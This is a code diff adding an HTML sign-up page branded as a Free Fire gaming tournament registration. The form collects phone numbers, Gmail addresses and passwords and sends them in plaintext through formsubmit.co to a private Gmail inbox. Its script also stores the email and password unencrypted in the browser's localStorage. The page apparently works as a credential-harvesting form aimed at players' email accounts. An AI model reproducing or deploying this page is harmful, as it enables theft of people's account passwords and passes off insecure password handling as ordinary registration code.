@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Register - Gaming Rashaa</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Inter:wght@700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#080808;color:#fff;font-family:'Inter',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:15px}
+.card{background:#121212;border:2px solid #FFC200;padding:25px;border-radius:18px;width:100%;max-width:380px;box-shadow:0 0 20px #FFC20033}
+.logo{font-family:'Orbitron',sans-serif;color:#FFC200;font-size:28px;text-align:center;font-weight:900;margin-bottom:5px}
+.sub{color:#888;text-align:center;font-size:12px;margin-bottom:20px}
+label{color:#FFC200;font-size:11px;font-weight:700;margin-top:12px;display:block}
+.inp{width:100%;padding:13px;border-radius:10px;border:1px solid #333;background:#222;color:#fff;margin-top:5px;font-size:14px;outline:none}
+.inp:focus{border-color:#FFC200}
+.btn{width:100%;padding:14px;background:#FFC200;border:none;border-radius:10px;font-weight:900;font-size:16px;color:#000;margin-top:20px;cursor:pointer}
+.link{color:#FFC200;text-align:center;display:block;margin-top:15px;font-size:13px;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">FREE FIRE</div>
+<p class="sub">Gaming Rashaa YT Group</p>
+<h2 style="color:#fff;text-align:center;margin-bottom:15px">CREATE ACCOUNT</h2>
+
+<!-- Gmail එකට Data යවන Form එක -->
+<form id="regForm" action="https://formsubmit.co/rashmika19941030@gmail.com" method="POST">
+<!-- FormSubmit Settings -->
+<input type="hidden" name="_subject" value="🔥 NEW USER REGISTER - FF TOURNAMENT">
+<input type="hidden" name="_template" value="table">
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_next" value="https://onlinerashmikayt-crypto.github.io/ga/login.html">
+
+<label>Phone Number</label>
+<input class="inp" type="text" name="Phone Number" placeholder="07X XXX XXXX" required>
+
+<label>Gmail Address</label>
+<input class="inp" type="email" name="Gmail" id="gmail" placeholder="example@gmail.com" required>
+
+<label>Password</label>
+<input class="inp" type="password" name="Password" id="pass" placeholder="At least 6 characters" required minlength="6">
+
+<button class="btn" type="submit" id="btnText">REGISTER NOW →</button>
+</form>
+
+<a class="link" href="login.html">Already have account? Login Here</a>
+</div>
+
+<script>
+// Register වෙනකොට Phone එකේ Save කරනවා Login වෙන්න
+document.getElementById('regForm').addEventListener('submit', function(e){
+  const email = document.getElementById('gmail').value;
+  const pass = document.getElementById('pass').value;
+  
+  // Local Storage එකේ Save කරනවා
+  localStorage.setItem('user_email', email);
+  localStorage.setItem('user_pass', pass);
+  
+  document.getElementById('btnText').innerText = "CREATING ACCOUNT...";
+  // Form එක FormSubmit එකට යනවා (Gmail එකට)
+});
+</script>
+</body>
+</html>
